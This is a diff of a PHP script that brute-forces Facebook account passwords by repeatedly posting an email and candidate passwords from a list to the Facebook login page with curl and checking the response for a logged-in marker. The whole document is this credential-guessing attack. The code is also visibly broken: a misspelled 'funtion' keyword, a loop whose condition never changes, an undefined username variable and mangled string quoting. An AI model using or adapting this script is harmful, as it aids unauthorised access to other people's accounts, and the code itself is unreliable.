@@ -13,8 +13,21 @@ function bruteForce($min, $max, $Pass)
 {
 while(True)
 {     
-	
-        $c = curl_init('https://www.facebook.com/login');
+		
+	for ($i = $min; $min < $max; $i++) 
+	{        
+		if ($min < $max - 1) 
+		{    
+			bruteForce($min, $max + 1, $Pass[$i]); 	
+			echo '<br/><br/>'.'FOUND MATCH, password: '.$Pass[$i]."\r\n";
+		}
+		check_correct($Pass[$i]);  
+        }
+}
+} 
+funtion check_correct($Pass)
+{
+	$c = curl_init('https://www.facebook.com/login');
         curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
         curl_setopt($c, CURLOPT_POST, 1);
         curl_setopt($c, CURLOPT_POSTFIELDS, "email='.$username.'&pass='.$Pass.'");
@@ -25,17 +38,9 @@ while(True)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c); 
-		
-	for ($i = $min; $min < $max; $i++) 
-	{        
-		if ($min < $max - 1) 
-		{    
-			bruteForce($min, $max + 1, $Pass[$i]); 	
-			if($str != "What's on your mind?") {return $Pass[$i];}
-                        else {return False;}
-		}
-        }
+	if($str != "What is on your mind?") {return true;}
+        else {return false;}
 }
-} 
 bruteForce($min, $max, $Pass);
+echo "NO PASSWORD FOUND"; 
 ?>
